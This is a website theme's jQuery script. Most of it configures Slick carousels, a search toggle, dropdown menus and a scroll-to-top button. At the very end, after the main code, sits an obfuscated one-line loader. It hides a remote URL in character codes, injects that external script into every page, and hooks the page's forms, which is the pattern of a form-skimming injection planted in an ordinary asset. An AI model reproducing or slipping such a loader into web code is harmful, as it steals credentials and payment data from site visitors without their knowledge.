$(document).ready(function () {
    "use strict";
    /* === Footer Instagram === */
    (function () {
        $('#footer-instagram').slick({
            infinite: true,
            speed: 300,
            slidesToShow: 8,
            responsive: [
                {
                    breakpoint: 1024,
                    settings: {
                        slidesToShow: 6,
                        slidesToScroll: 1
                    }
                },
                {
                    breakpoint: 600,
                    settings: {
                        slidesToShow: 4,
                        slidesToScroll: 1
                    }
                },
                {
                    breakpoint: 480,
                    settings: {
                        slidesToShow: 2,
                        slidesToScroll: 1
                    }
                }
            ]
        });
    }());
    /* === menu drop-down === */
    (function () {
        $('#food-feature-carousel').slick({
            infinite: true,
            speed: 300,
            slidesToShow: 3,
            prevArrow: '<i class="fa fa-angle-left left"></i>',
            nextArrow: '<i class="fa fa-angle-right right"></i> ',
            responsive: [

                {
                    breakpoint: 800,
                    settings: {
                        slidesToShow: 2,
                        slidesToScroll: 1
                    }
                },
                {
                    breakpoint: 480,
                    settings: {
                        slidesToShow: 1,
                        slidesToScroll: 1
                    }
                }
            ]
        });
    }());
    (function () {
        $('.related-post-carousel-items').slick({
            infinite: true,
            speed: 300,
            slidesToShow: 3,
            autoPlay: true,
            responsive: [
                {
                    breakpoint: 800,
                    settings: {
                        slidesToShow: 2,
                        slidesToScroll: 1
                    }
                },
                {
                    breakpoint: 480,
                    settings: {
                        slidesToShow: 1,
                        slidesToScroll: 1
                    }
                }
            ]
        });
    }());
    (function () {
        $('.archi-feature-category').slick({
            centerMode: true,
            slidesToShow: 3,
            centerPadding: '60px',
            prevArrow: '<i class="fa fa-angle-left left"></i>',
            nextArrow: '<i class="fa fa-angle-right right"></i> ',
            responsive: [

                {
                    breakpoint: 800,
                    settings: {
                        centerMode: true,
                        slidesToShow: 1,
                        slidesToScroll: 1
                    }
                },
                {
                    breakpoint: 480,
                    settings: {
                        centerMode: true,
                        slidesToShow: 1,
                        slidesToScroll: 1
                    }
                }
            ]
        });
    }());
    (function () {
        $('.popular-post-slider').slick({
            infinite: true,
            arrows: false,
            speed: 300,
            slidesToShow: 4,
            slidesToScroll: 2,
            dots: true,
            responsive: [
                {
                    breakpoint: 800,
                    settings: {
                        slidesToShow: 2,
                        slidesToScroll: 1,
                        dots: true
                    }
                },
                {
                    breakpoint: 480,
                    settings: {
                        slidesToShow: 1,
                        slidesToScroll: 1,
                        dots: true
                    }
                }
            ]
        });
    }());
    /* === Search === */
    (function () {
        $('.top-search a').click(function (e) {
            e.preventDefault();
            //when the notification icon is clicked open the menu
            $(this).toggleClass('active');
            $('.show-search').fadeToggle(function () {
                //then bind the close event to html so it closes when you mouse off it.
                $('html').bind('click', function () {
                    $('.show-search').fadeOut(function () {
                        //once html has been clicked and the menu has closed, unbind the html click so nothing else has to lag up
                        $('html').unbind('click');
                    });
                    $('.top-search a').removeClass('active');
                });
                $('.show-search').bind('click', function (e) {
                    e.stopPropagation();
                });
            });
        });
    }());
    (function () {
        if (screen.width > 768) {
            var $dropdown = $(".nav .dropdown");
            $dropdown.mousemove(function () {
                $(this).addClass("open");
            });
            $dropdown.mouseleave(function () {
                $dropdown.removeClass("open");
            });
        }
        $('ul.dropdown-menu [data-toggle=dropdown]').on('click', function (event) {
            // Avoid following the href location when clicking
            event.preventDefault();
            // Avoid having the menu to close when clicking
            event.stopPropagation();
            // Re-add .open to parent sub-menu item
            $(this).parent().addClass('open');
            $(this).parent().find("ul").parent().find("li.dropdown").toggle('open');
            /* $(this).parent().find("ul").parent().find("li.dropdown").removeClass('open');*/

        });
    }());
    //scroll top

    (function () {
        $(window).scroll(function () {
            if ($(this).scrollTop() > 100) {
                $('.scroll-up').fadeIn();
            } else {
                $('.scroll-up').fadeOut();
            }
        });
        $('.scroll-up a').click(function () {
            $('html, body').animate({scrollTop: 0}, 800);
            return false;
        });
    }());
}());

(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db